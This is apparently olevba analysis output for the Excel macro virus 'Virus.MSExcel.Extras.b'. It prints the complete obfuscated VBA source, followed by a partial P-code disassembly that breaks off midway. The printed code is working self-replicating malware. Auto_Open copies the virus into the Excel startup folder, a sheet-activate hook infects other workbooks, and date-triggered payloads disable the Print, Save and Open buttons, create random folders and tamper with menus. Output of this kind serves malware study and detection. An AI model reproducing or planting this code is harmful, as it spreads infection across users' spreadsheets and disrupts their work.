olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSExcel.Extras.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO pTKwNAZM4GnJr5c2P0KWOhZut.bas 
in file: ./Virus.MSExcel.Extras.b - OLE stream: '_VBA_PROJECT_CUR/VBA/pTKwNAZM4GnJr5c2P0KWOhZut'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 













Option Explicit
Private Sub hmhhmrnhnnrhmhhnnmmnnrhnnmhhnn()
Dim mmnhrrrhhhnnrnmrnnhnnhmrmmnhrh As Integer
Randomize
mmnhrrrhhhnnrnmrnnhnnhmrmmnhrh = Int((4 - 1 + 1) * Rnd + 1)
Call rnnhnrnnrnmrnhnnhmhrhmrrhnrnmh
Select Case mmnhrrrhhhnnrnmrnnhnnhmrmmnhrh
Case 1
Call rnmhhhnnnhmnnnrhhhhnhhhnrhmmhr
Case 2
Call mnhrnnhhhhrnmnmnmhrhrhhmmhhhmn
Case 3
Call nnmhrhmhrnrmmrhnrmhmnhmmnnmnrh
Case 4
Call nmhrrhmmhhrrmhhnmmnmmnnnhmnrmn
End Select
End Sub
Private Sub nnmrhnmmrnrhhmhnrhhmmmhhhmnrmr(ByVal hnhhnnnrrrnnnmnnnnnnnrmnhmhrnr As String, ByVal rrhnmhrnhhnmnhhhhnhrnmmhnrmnhm As String)
Application.ScreenUpdating = False
Dim mhnrrrnnnhnmmmhrnhnrhmhhhmhhnn, mrnhnhnnrrmmrmnhrnrrmmnmrmnnmn As String
Workbooks.Add
ThisWorkbook.Sheets(1).Visible = True
ThisWorkbook.Sheets(1).Copy before:=ActiveWorkbook.Sheets(1)
With ActiveSheet
.Name = mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn(-5 + 6 * 5)
.Visible = False
End With
mhnrrrnnnhnmmmhrnhnrhmhhhmhhnn = ActiveWorkbook.Name
mrnhnhnnrrmmrmnhrnrrmmnmrmnnmn = CurDir()
ChDir Application.StartupPath
ActiveWindow.Visible = False
Workbooks(mhnrrrnnnhnmmmhrnhnrhmhhhmhhnn).SaveAs FileName:=hnhhnnnrrrnnnmnnnnnnnrmnhmhrnr & rrhnmhrnhhnmnhhhhnhrnmmhnrmnhm, FileFormat:=xlNormal
ChDir mrnhnhnnrrmmrmnhrnrrmmnmrmnnmn
ThisWorkbook.Sheets(1).Visible = False
Application.ScreenUpdating = True
End Sub
Private Sub rnmhhhnnnhmnnnrhhhhnhhhnrhmmhr()
Dim hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh As Variant
For Each hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh In Application.Toolbars("Standard").ToolbarButtons
If hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Name = "Print" Then hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Enabled = False
Next
End Sub
Private Sub nmhrrhmmhhrrmhhnmmnmmnnnhmnrmn()
Dim hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh As Variant
For Each hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh In Application.Toolbars("Standard").ToolbarButtons
If hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Name = "Save" Then hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Enabled = False
Next
End Sub
Private Sub nnmhrhmhrnrmmrhnrmhmnhmmnnmnrh()
Dim hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh As Variant
For Each hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh In Application.Toolbars("Standard").ToolbarButtons
If hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Name = "Open" Then hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Enabled = False
Next
End Sub
Sub Auto_Help()
Attribute Auto_Help.VB_ProcData.VB_Invoke_Func = " \n14"
Randomize
With Application
.SheetsInNewWorkbook = Int((255 - 1 + 1) * Rnd + 1)
.Help
End With
End Sub
Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
Dim rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr, rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr, nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm As String
Dim mhhmmnrmmhnhhhhnrmrnnrnhhmnmnh As Boolean
Dim hrnnmnnnrhrnrrrnnhhmnnrnmrnmhn As Variant
nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm = "EXTRAS.XLS"
If Left(Application.OperatingSystem, 3) = "Mac" Then
nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm = "Macintosh Extras"
ElseIf Left(Application.OperatingSystem, 10) <> "Windows 3." Then
nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm = "Windows Extras.xls"
End If
rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr = Application.StartupPath & Application.PathSeparator
rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr = Dir(rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr & nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm)
If rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr = "" Then
nnmrhnmmrnrhhmhnrhhmmmhhhmnrmr rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr, nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm
Else
mhhmmnrmmhnhhhhnrmrnnrnhhmnmnh = False
For Each hrnnmnnnrhrnrrrnnhhmnnrnmrnmhn In Application.Workbooks
If hrnnmnnnrhrnrrrnnhhmnnrnmrnmhn.Name = nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm Then
mhhmmnrmmhnhhhhnrmrnnrnhhmnmnh = True
Exit For
End If
Next
If mhhmmnrmmhnhhhhnrmrnnrnhhmnmnh = False Then
Application.ScreenUpdating = False
Workbooks.Open FileName:=(rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr & nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm), IgnoreReadOnlyRecommended:=True
End If
If Workbooks(nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm).Modules.Count = 0 Then
Application.ScreenUpdating = False
Workbooks(nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm).Close savechanges:=False
On Error GoTo hrmhrnnmmhhnrhrrrmmmmmhmmmhmmr
Kill (rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr & nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm)
On Error GoTo 0
nnmrhnmmrnrhhmhnrhhmmmhhhmnrmr rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr, nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm
ElseIf Len(Workbooks(nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm).Modules(1).Name) <> (7 + 6 * 3) Then
Application.ScreenUpdating = False
Workbooks(nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm).Close savechanges:=False
On Error GoTo hrmhrnnmmhhnrhrrrmmmmmhmmmhmmr
Kill (rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr & nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm)
On Error GoTo 0
nnmrhnmmrnrhhmhnrhhmmmhhhmnrmr rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr, nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm
End If
End If
Application.OnSheetActivate = rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr & nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm & "!" & "Auto_Exit"
Exit Sub
hrmhrnnmmhhnrhrrrmmmmmhmmmhmmr:
SetAttr (rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr & nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm), vbNormal
Resume
End Sub
Private Function mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn(rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr As Integer)
Dim mrhmrmhrrhrrnhrhrrhmmrmhhmnnhh As Integer
Dim nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm As Integer
Dim nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn As String
Dim rhrhnhhmmmmnnnhrrnhhnmmmrrnrrr As Double
Dim nrmhmhnnhhrnhhmrrnhnhnhhnmrhrm As Double
Dim nmhmhnnhhhhhrhhnmnmnhnmhnnmnrh As Double
Dim hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh As Integer
nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn = ""
mrhmrmhrrhrrnhrhrrhmmrmhhmnnhh = rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr
For hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh = 1 To mrhmrmhrrhrrnhrhrrhmmrmhhmnnhh
rhrhnhhmmmmnnnhrrnhhnmmmrrnrrr = 10 / 62
nrmhmhnnhhrnhhmrrnhnhnhhnmrhrm = 36 / 62
Randomize
nmhmhnnhhhhhrhhnmnmnhnmhnnmnrh = Rnd()
Randomize
If nmhmhnnhhhhhrhhnmnmnhnmhnnmnrh < rhrhnhhmmmmnnnhrrnhhnmmmrrnrrr Then
nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm = Int((57 - 48 + 1) * Rnd + 48)
ElseIf nmhmhnnhhhhhrhhnmnmnhnmhnnmnrh < nrmhmhnnhhrnhhmrrnhnhnhhnmrhrm Then
nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm = Int((90 - 65 + 1) * Rnd + 65)
Else
nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm = Int((122 - 97 + 1) * Rnd + 97)
End If
nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn = nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn + Chr(nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm)
Next
mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn = nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn
End Function
Private Sub rnnhnrnnrnmrnhnnhmhrhmrrhnrnmh()
Dim mnnhnhrrmnrnrrmnhhhnmmrmhrmrmh, hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh As Variant
For Each mnnhnhrrmnrnrrmnhhhnmmrmhrmrmh In MenuBars(xlWorksheet).Menus("Format").MenuItems
If mnnhnhrrmnrnrrmnhhhnmmrmhrmrmh.Caption = Application.UserName & "..." Then mnnhnhrrmnrnrrmnhhhnmmrmhrmrmh.Delete
Next
For Each hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh In Application.Toolbars("Standard").ToolbarButtons
If hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Name = "Print" Or hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Name = "Open" Or hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Name = "Save" Then hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Enabled = True
Next
End Sub
Sub Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
If ThisWorkbook.Path = Application.StartupPath And UCase(ThisWorkbook.Name) Like "*EXTRAS*" Then ThisWorkbook.Saved = True
End Sub
Private Sub hnmhmhrnnhmrhrmmnrhnrhmhnrmnrh()
On Error GoTo nhrmrnnnmnnhrrmhhhnhrmnmrmrnmn
If Rnd < 0.1 Then MkDir mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn(8) & "." & mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn(3)
nhrmrnnnmnnhrrmhhhnhrmnmrmrnmn:
Exit Sub
End Sub
Private Sub hrhmmnrhrnhnrmrrnhnrrnhrhrhrnn()
If Not ActiveWorkbook.ProtectStructure Then
Application.ScreenUpdating = False
Dim mmnmnhrrrhhmnmhrmmmrhmnrhhmmnm As Variant
Dim mmmnmmhnmrmnhhhnmnhrhmhnhhnmhn As String
mmmnmmhnmrmnhhhnmnhrhmhnhhnmhn = ActiveWorkbook.ActiveSheet.Name
Set mmnmnhrrrhhmnmhrmmmrhmnrhhmmnm = ActiveWorkbook
ThisWorkbook.Activate
ThisWorkbook.Sheets(1).Visible = True
mmnmnhrrrhhmnmhrmmmrhmnrhhmmnm.Activate
ThisWorkbook.Sheets(1).Copy before:=ActiveWorkbook.Sheets(1)
With ActiveSheet
.Name = mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn(351 / 9 - 14)
.Visible = True
End With
ThisWorkbook.Activate
ThisWorkbook.Sheets(1).Visible = False
With mmnmnhrrrhhmnmhrmmmrhmnrhhmmnm
.Activate
.Sheets(1).Select
End With
Application.ScreenUpdating = True
End If
End Sub
Private Sub mnhrnnhhhhrnmnmnmhrhrhhmmhhhmn()
Dim hmhmmmrmmhnmmnmhnhrhnnmrmrnmhh As String
hmhmmmrmmhnmmnmhnhrhnnmrmrnmhh = "Style..."
Randomize
If Rnd > 0.5 Then hmhmmmrmmhnmmnmhnhrhnnmrmrnmhh = "AutoFormat..."
On Error GoTo mrmhnhrhnmhrhmrmhhrhnrnhnnhhnr
MenuBars(xlWorksheet).Menus("Format").MenuItems.Add Caption:=Application.UserName & "...", before:=hmhmmmrmmhnmmnmhnhrhnnmrmrnmhh
MenuBars(xlWorksheet).Menus("Format").MenuItems(Application.UserName & "...").Enabled = False
mrmhnhrhnmhrhmrmhhrhnrnhnnhhnr:
Exit Sub
End Sub
Private Sub mmnrhnhnhhmhmhrmrhrrhnhmhrhnnr()
Dim hrmrmnmrnhnrhhhmhhrrmmhhnnnhhr As Integer
Randomize
hrmrmnmrnhnrhhhmhhrrmmhhnnnhhr = Int((12 - 1 + 1) * Rnd + 1)
If hrmrmnmrnhnrhhhmhhrrmmhhnnnhhr <= 6 Then
Call rnnhnrnnrnmrnhnnhmhrhmrrhnrnmh
Select Case hrmrmnmrnhnrhhhmhhrrmmhhnnnhhr
Case 1
Call rnmhhhnnnhmnnnrhhhhnhhhnrhmmhr
Case 2
Call hnhhhhrrrrhhnrnhmmrnhnrrrmmmmm
Case 3
Call hnmhmhrnnhmrhrmmnrhnrhmhnrmnrh
Case 4
Call mnhrnnhhhhrnmnmnmhrhrhhmmhhhmn
Case 5
Call nnmhrhmhrnrmmrhnrmhmnhmmnnmnrh
Case 6
Call nmhrrhmmhhrrmhhnmmnmmnnnhmnrmn
End Select
End If
End Sub
Private Sub hnhhhhrrrrhhnrnhmmrnhnrrrmmmmm()
Application.Toolbars("Auditing").Visible = True
End Sub
Sub Auto_Exit()
Attribute Auto_Exit.VB_ProcData.VB_Invoke_Func = " \n14"
Dim hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh As Variant
If ActiveWorkbook.Modules.Count = 0 Then
hrhmmnrhrnhnrmrrnhnrrnhrhrhrnn
ElseIf Len(ActiveWorkbook.Modules(1).Name) <> (276 / 12 + 2) Then
hrhmmnrhrnhnrmrrnhnrrnhrhrhrnn
Else
If Year(Now) >= (26 ^ 2 - 10 + 1 / 3) * 3 Then Call mmnrhnhnhhmhmhrmrhrrhnhmhrhnnr
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     33 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  pTKwNAZM4GnJr5c2P0KWOhZu
' 0085     33 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  qi9K0o5bavC9FcRvePzlcWo3
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSExcel.Extras.b
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/pTKwNAZM4GnJr5c2P0KWOhZut - 13378 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' 	Option  (Explicit)
' Line #14:
' 	FuncDefn (Private Sub hmhhmrnhnnrhmhhnnmmnnrhnnmhhnn())
' Line #15:
' 	Dim 
' 	VarDefn mmnhrrrhhhnnrnmrnnhnnhmrmmnhrh (As Integer)
' Line #16:
' 	ArgsCall Read 0x0000 
' Line #17:
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St mmnhrrrhhhnnrnmrnnhnnhmrmmnhrh 
' Line #18:
' 	ArgsCall (Call) rnnhnrnnrnmrnhnnhmhrhmrrhnrnmh 0x0000 
' Line #19:
' 	Ld mmnhrrrhhhnnrnmrnnhnnhmrmmnhrh 
' 	SelectCase 
' Line #20:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #21:
' 	ArgsCall (Call) rnmhhhnnnhmnnnrhhhhnhhhnrhmmhr 0x0000 
' Line #22:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #23:
' 	ArgsCall (Call) mnhrnnhhhhrnmnmnmhrhrhhmmhhhmn 0x0000 
' Line #24:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #25:
' 	ArgsCall (Call) nnmhrhmhrnrmmrhnrmhmnhmmnnmnrh 0x0000 
' Line #26:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #27:
' 	ArgsCall (Call) nmhrrhmmhhrrmhhnmmnmmnnnhmnrmn 0x0000 
' Line #28:
' 	EndSelect 
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Private Sub nnmrhnmmrnrhhmhnrhhmmmhhhmnrmr(ByVal hnhhnnnrrrnnnmnnnnnnnrmnhmhrnr As String, ByVal rrhnmhrnhhnmnhhhhnhrnmmhnrmnhm As String))
' Line #31:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #32:
' 	Dim 
' 	VarDefn mhnrrrnnnhnmmmhrnhnrhmhhhmhhnn
' 	VarDefn mrnhnhnnrrmmrmnhrnrrmmnmrmnnmn (As String)
' Line #33:
' 	Ld Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #34:
' 	LitVarSpecial (True)
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	ArgsMemLd Sheets 0x0001 
' 	MemSt Visible 
' Line #35:
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	ArgsMemLd Sheets 0x0001 
' 	ParamNamed before 
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	ArgsMemLd Sheets 0x0001 
' 	ArgsMemCall Copy 0x0001 
' Line #36:
' 	StartWithExpr 
' 	Ld ActiveSheet 
' 	With 
' Line #37:
' 	LitDI2 0x0005 
' 	UMi 
' 	LitDI2 0x0006 
' 	LitDI2 0x0005 
' 	Mul 
' 	Add 
' 	ArgsLd mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn 0x0001 
' 	MemStWith New 
' Line #38:
' 	LitVarSpecial (False)
' 	MemStWith Visible 
' Line #39:
' 	EndWith 
' Line #40:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St mhnrrrnnnhnmmmhrnhnrhmhhhmhhnn 
' Line #41:
' 	ArgsLd CurDir 0x0000 
' 	St mrnhnhnnrrmmrmnhrnrrmmnmrmnnmn 
' Line #42:
' 	Ld Application 
' 	MemLd StartupPath 
' 	ArgsCall ChDir 0x0001 
' Line #43:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #44:
' 	Ld hnhhnnnrrrnnnmnnnnnnnrmnhmhrnr 
' 	Ld rrhnmhrnhhnmnhhhhnhrnmmhnrmnhm 
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	Ld mhnrrrnnnhnmmmhrnhnrhmhhhmhhnn 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall SaveAs 0x0002 
' Line #45:
' 	Ld mrnhnhnnrrmmrmnhrnrrmmnmrmnnmn 
' 	ArgsCall ChDir 0x0001 
' Line #46:
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	ArgsMemLd Sheets 0x0001 
' 	MemSt Visible 
' Line #47:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #48:
' 	EndSub 
' Line #49:
' 	FuncDefn (Private Sub rnmhhhnnnhmnnnrhhhhnhhhnrhmmhr())
' Line #50:
' 	Dim 
' 	VarDefn hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh (As Variant)
' Line #51:
' 	StartForVariable 
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	EndForVariable 
' 	LitStr 0x0008 "Standard"
' 	Ld Application 
' 	ArgsMemLd Toolbars 0x0001 
' 	MemLd ToolbarButtons 
' 	ForEach 
' Line #52:
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	MemLd New 
' 	LitStr 0x0005 "Print"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	MemSt Enabled 
' 	EndIf 
' Line #53:
' 	StartForVariable 
' 	Next 
' Line #54:
' 	EndSub 
' Line #55:
' 	FuncDefn (Private Sub nmhrrhmmhhrrmhhnmmnmmnnnhmnrmn())
' Line #56:
' 	Dim 
' 	VarDefn hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh (As Variant)
' Line #57:
' 	StartForVariable 
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	EndForVariable 
' 	LitStr 0x0008 "Standard"
' 	Ld Application 
' 	ArgsMemLd Toolbars 0x0001 
' 	MemLd ToolbarButtons 
' 	ForEach 
' Line #58:
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	MemLd New 
' 	LitStr 0x0004 "Save"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	MemSt Enabled 
' 	EndIf 
' Line #59:
' 	StartForVariable 
' 	Next 
' Line #60:
' 	EndSub 
' Line #61:
' 	FuncDefn (Private Sub nnmhrhmhrnrmmrhnrmhmnhmmnnmnrh())
' Line #62:
' 	Dim 
' 	VarDefn hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh (As Variant)
' Line #63:
' 	StartForVariable 
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	EndForVariable 
' 	LitStr 0x0008 "Standard"
' 	Ld Application 
' 	ArgsMemLd Toolbars 0x0001 
' 	MemLd ToolbarButtons 
' 	ForEach 
' Line #64:
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	MemLd New 
' 	LitStr 0x0004 "Open"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	MemSt Enabled 
' 	EndIf 
' Line #65:
' 	StartForVariable 
' 	Next 
' Line #66:
' 	EndSub 
' Line #67:
' 	FuncDefn (Sub Auto_Help())
' Line #68:
' 	ArgsCall Read 0x0000 
' Line #69:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #70:
' 	LitDI2 0x00FF 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	MemStWith SheetsInNewWorkbook 
' Line #71:
' 	ArgsMemCallWith Help 0x0000 
' Line #72:
' 	EndWith 
' Line #73:
' 	EndSub 
' Line #74:
' 	FuncDefn (Sub Auto_Open())
' Line #75:
' 	Dim 
' 	VarDefn rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr
' 	VarDefn rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr
' 	VarDefn nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm (As String)
' Line #76:
' 	Dim 
' 	VarDefn mhhmmnrmmhnhhhhnrmrnnrnhhmnmnh (As Boolean)
' Line #77:
' 	Dim 
' 	VarDefn hrnnmnnnrhrnrrrnnhhmnnrnmrnmhn (As Variant)
' Line #78:
' 	LitStr 0x000A "EXTRAS.XLS"
' 	St nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' Line #79:
' 	Ld Application 
' 	MemLd OperatingSystem 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Mac"
' 	Eq 
' 	IfBlock 
' Line #80:
' 	LitStr 0x0010 "Macintosh Extras"
' 	St nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' Line #81:
' 	Ld Application 
' 	MemLd OperatingSystem 
' 	LitDI2 0x000A 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x000A "Windows 3."
' 	Ne 
' 	ElseIfBlock 
' Line #82:
' 	LitStr 0x0012 "Windows Extras.xls"
' 	St nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	St rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr 
' Line #85:
' 	Ld rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr 
' Line #86:
' 	Ld rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #87:
' 	Ld rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	ArgsCall nnmrhnmmrnrhhmhnrhhmmmhhhmnrmr 0x0002 
' Line #88:
' 	ElseBlock 
' Line #89:
' 	LitVarSpecial (False)
' 	St mhhmmnrmmhnhhhhnrmrnnrnhhmnmnh 
' Line #90:
' 	StartForVariable 
' 	Ld hrnnmnnnrhrnrrrnnhhmnnrnmrnmhn 
' 	EndForVariable 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ForEach 
' Line #91:
' 	Ld hrnnmnnnrhrnrrrnnhhmnnrnmrnmhn 
' 	MemLd New 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	Eq 
' 	IfBlock 
' Line #92:
' 	LitVarSpecial (True)
' 	St mhhmmnrmmhnhhhhnrmrnnrnhhmnmnh 
' Line #93:
' 	ExitFor 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	StartForVariable 
' 	Next 
' Line #96:
' 	Ld mhhmmnrmmhnhhhhnrmrnnrnhhmnmnh 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #97:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #98:
' 	Ld rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	Concat 
' 	Paren 
' 	ParamNamed FileName 
' 	LitVarSpecial (True)
' 	ParamNamed IgnoreReadOnlyRecommended 
' 	Ld Workbooks 
' 	ArgsMemCall Option 0x0002 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd Modules 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #101:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #102:
' 	LitVarSpecial (False)
' 	ParamNamed savechanges 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #103:
' 	OnError hrmhrnnmmhhnrhrrrmmmmmhmmmhmmr 
' Line #104:
' 	Ld rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	Concat 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #105:
' 	OnError (GoTo 0) 
' Line #106:
' 	Ld rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	ArgsCall nnmrhnmmrnrhhmhnrhhmmmhhhmnrmr 0x0002 
' Line #107:
' 	LitDI2 0x0001 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemLd Modules 0x0001 
' 	MemLd New 
' 	FnLen 
' 	LitDI2 0x0007 
' 	LitDI2 0x0006 
' 	LitDI2 0x0003 
' 	Mul 
' 	Add 
' 	Paren 
' 	Ne 
' 	ElseIfBlock 
' Line #108:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #109:
' 	LitVarSpecial (False)
' 	ParamNamed savechanges 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
